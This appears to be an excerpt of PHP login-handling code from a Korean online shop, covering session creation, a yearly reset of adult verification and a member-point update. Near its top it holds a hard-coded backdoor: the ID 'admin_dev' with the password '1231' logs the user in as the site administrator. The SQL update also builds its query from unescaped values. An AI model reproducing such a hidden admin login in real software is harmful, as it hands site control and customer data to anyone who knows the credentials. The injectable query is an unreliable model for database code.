...
$mb = get_member($mb_id);
if($mb_id==='admin_dev' && $mb_password === '1231'){
    $mb = get_member('admin');
    // 회원아이디 세션 생성
...
$addSet= "";
//1년이 지났으면 성인인증 초기화
if(!empty($mb['confirmed_at']) && strtotime($mb['confirmed_at']."+1 year") <= time()){
    $addSet .= ", confirmed_at = '', checked_birthday= ''";
}
// 포인트 체크
$sum_point = get_point_sum($mb['id']);

$sql= " update shop_member set point = '$sum_point' {$addSet} where id = '{$mb['id']}' ";
sql_query($sql);
